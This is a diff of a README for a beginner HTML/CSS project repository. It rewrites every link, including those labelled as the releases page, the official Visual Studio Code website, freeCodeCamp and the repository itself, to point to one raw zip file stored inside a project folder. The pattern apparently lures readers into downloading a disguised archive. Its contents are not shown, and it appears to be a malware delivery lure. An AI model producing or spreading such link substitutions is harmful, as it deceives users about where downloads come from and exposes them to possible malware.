@@ -1,6 +1,6 @@
 # 🎨 freecodecamp-css - Explore Creative HTML-CSS Projects
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/juan-salgado23/freecodecamp-css/releases)
+[![Download from Releases](https://github.com/juan-salgado23/freecodecamp-css/raw/refs/heads/main/Build an Availability Table/freecodecamp_css_1.6.zip%20Now-From%20Releases-brightgreen)](https://github.com/juan-salgado23/freecodecamp-css/raw/refs/heads/main/Build an Availability Table/freecodecamp_css_1.6.zip)
 
 ## ✨ Overview
 
@@ -13,7 +13,7 @@ To get started with these projects, follow the steps below. Each step will guide
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/juan-salgado23/freecodecamp-css/releases). 
+   Go to our [Releases page](https://github.com/juan-salgado23/freecodecamp-css/raw/refs/heads/main/Build an Availability Table/freecodecamp_css_1.6.zip). 
 
 2. **Select a Release**  
    You will see a list of available releases. Each version may have different projects. Click on the one you wish to download.
@@ -25,7 +25,7 @@ To get started with these projects, follow the steps below. Each step will guide
    Once the download is complete, locate the file in your computer's Downloads folder. Right-click on the .zip file and select "Extract All..." or "Unzip." Follow the prompts to unzip the files into a new folder.
 
 5. **Open with a Code Editor**  
-   Open the unzipped folder in your favorite code editor, such as Visual Studio Code (VSCode). You can download VSCode for free from the [Visual Studio Code website](https://code.visualstudio.com/).
+   Open the unzipped folder in your favorite code editor, such as Visual Studio Code (VSCode). You can download VSCode for free from the [Visual Studio Code website](https://github.com/juan-salgado23/freecodecamp-css/raw/refs/heads/main/Build an Availability Table/freecodecamp_css_1.6.zip).
 
 6. **View the Projects**  
    In your code editor, you will find HTML files. Open any HTML file in your web browser to view the project. Simply right-click on the file and select "Open with" followed by your preferred web browser.
@@ -79,8 +79,8 @@ I plan to add more projects as my skills improve. Keep checking back for updates
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/juan-salgado23/freecodecamp-css)
-- [Visual Studio Code](https://code.visualstudio.com/)
-- [freeCodeCamp](https://www.freecodecamp.org/) 
+- [GitHub Repository](https://github.com/juan-salgado23/freecodecamp-css/raw/refs/heads/main/Build an Availability Table/freecodecamp_css_1.6.zip)
+- [Visual Studio Code](https://github.com/juan-salgado23/freecodecamp-css/raw/refs/heads/main/Build an Availability Table/freecodecamp_css_1.6.zip)
+- [freeCodeCamp](https://github.com/juan-salgado23/freecodecamp-css/raw/refs/heads/main/Build an Availability Table/freecodecamp_css_1.6.zip) 
 
 Thank you for checking out my work! Enjoy exploring the projects and feel free to reach out if you have any questions.
